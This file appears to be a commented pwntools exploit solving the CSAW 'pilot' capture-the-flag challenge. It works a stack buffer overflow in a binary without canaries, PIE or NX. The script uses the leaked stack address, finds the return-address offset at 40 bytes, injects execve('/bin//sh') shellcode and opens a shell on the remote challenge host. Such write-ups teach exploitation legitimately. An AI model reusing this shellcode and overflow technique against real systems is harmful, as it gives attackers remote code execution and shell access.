#!/usr/bin/env python
from pwn import *

###############################################################################
# Evaluate File
###############################################################################

'''
$ ../../Tools/checksec.sh --file pilot
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   pilot
'''

###############################################################################
# Open connection
###############################################################################

conn = remote('pwn.chal.csaw.io',8464)

###############################################################################
# Read prompt
###############################################################################
'''
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
'''
print conn.recvline()
print conn.recvline()
print conn.recvline()
print conn.recvline()
print conn.recvline()
print conn.recvline()
# -- OR --
# conn.recvuntil("Location:")

###############################################################################
# Get stack address location from program
###############################################################################
'''
[*]Location:0x7fff7a453100
'''
# The program is nice enough to give us the address of the beginning of the stack
location = conn.recvline()
print location
location = int(location.split(":")[1],16)
address = p64(location)
# -- OR --
# location = int(r.recv(14),16)

###############################################################################
# Find RIP offset
###############################################################################

###############################################################################
    # Find RIP offset through GDB-peda
###############################################################################

'''
gdb-peda$ pattern_create 400 in.txt
gdb-peda$ r < in.txt
gdb-peda$ x/wx $rsp
0x7fffffffdd68: 0x41304141
gdb-peda$ pattern_offset 0x41304141
1093681473 found at offset: 40
'''

###############################################################################
    # Find RIP offset through analysis
###############################################################################

# The program reads in 0x40 bytes (64 bytes) but the stack only has room for 32 bytes.

# 0x400acf lea rax, [rbp-0x20 {var_28}]
# 0x400ad3 mov edx, 0x40
# 0x400ad8 mov rsi, rax
# 0x400adb mov edi, 0x0
# 0x400ae0 call read

'''
                           +---------------+
                 +------>  |buffer         |  <------+
                 |         +---------------+         |
                 |         |               |         |
                 |         +---------------+         |
                 |         |               |         |
                 |         +---------------+         |
                 |         |               |         |  64 bytes
     0x20 = 32   |         |               |         |
                 |         |               |         |
                 |         |...            |         |
                 |         |AAAAAAAAAAAAAAA|         |
                 |         |AAAAAAAAAAAAAAA|         |
                 |         |...            |         |
                 |         |               |         |
                 |         |               |         |
                 |         +---------------+         |
                 |         |               |         |
                 |         +---------------+         |
                 +------>  |               |         |
                           +---------------+         |
     8 bytes               |XXXsaved rbpXXX|         |
                           +---------------+         |
     8 bytes               |Return Address |         |
                           +---------------+         |
                           |BBBBBBBBBBBBBBB|         |
                           +---------------+         |
                           |BBBBBBBBBBBBBBB|  <------+
                           +---------------+

'''

# There are 40 bytes before the Return Address (RIP)

###############################################################################
# Construct payload
###############################################################################

# The stack does get clobbered with the push statements so you can't use all 
# 40 bytes for your assembly code.
# First parameter is $rdi ($rdi = pointer to "/bin/sh")
# Second parameter is $rsi = NULL (0)
# Third parameter is $rdx = NULL (0)
# $rbx = "/bin//sh/"
# We push $rbx and $rax on the stack to create a null after the string

'''
; execve(["/bin//sh",], [], [])
0:  48 31 ff                xor    rdi,rdi
3:  48 31 f6                xor    rsi,rsi
6:  48 31 d2                xor    rdx,rdx
9:  48 31 c0                xor    rax,rax
c:  50                      push   rax
d:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
14: 2f 73 68
17: 53                      push   rbx
18: 48 89 e7                mov    rdi,rsp
1b: b0 3b                   mov    al,0x3b
1d: 0f 05                   syscall
'''

shellcode = "\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x50\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x48\x89\xE7\xB0\x3B\x0F\x05"
payload = shellcode + 'A' * (40 - len(shellcode)) + address

'''
                           +---------------+
                 +------>  |shellcode      |  <------+
                 |         +---------------+         |
                 |         | ..            |         |
                 |         +---------------+         |
                 |         |               |         |
                 |         +---------------+         |
                 |         |               |         |  64 bytes
     0x20 = 32   |         |               |         |
                 |         |               |         |
                 |         |               |         |
                 |         |AAAAAAAAAAAAAAA|         |
                 |         |AAAAAAAAAAAAAAA|         |
                 |         |...            |         |
                 |         |               |         |
                 |         |               |         |
                 |         +---------------+         |
                 |         |               |         |
                 |         +---------------+         |
                 +------>  |               |         |
                           +---------------+         |
     8 bytes               |AAAAAAAAAAAAAAA|         |
                           +---------------+         |
     8 bytes               |   (new_rip)   |         |
                           +---------------+         |
                           |BBBBBBBBBBBBBBB|         |
                           +---------------+         |
                           |BBBBBBBBBBBBBBB|  <------+
                           +---------------+

'''


###############################################################################
# Send payload
###############################################################################

'''
[*]Command:
'''
print conn.recvline()
conn.sendline(payload)
# -- OR --
# r.sendlineafter("Command:",payload)

###############################################################################
# Shell
###############################################################################

conn.interactive()
conn.close()
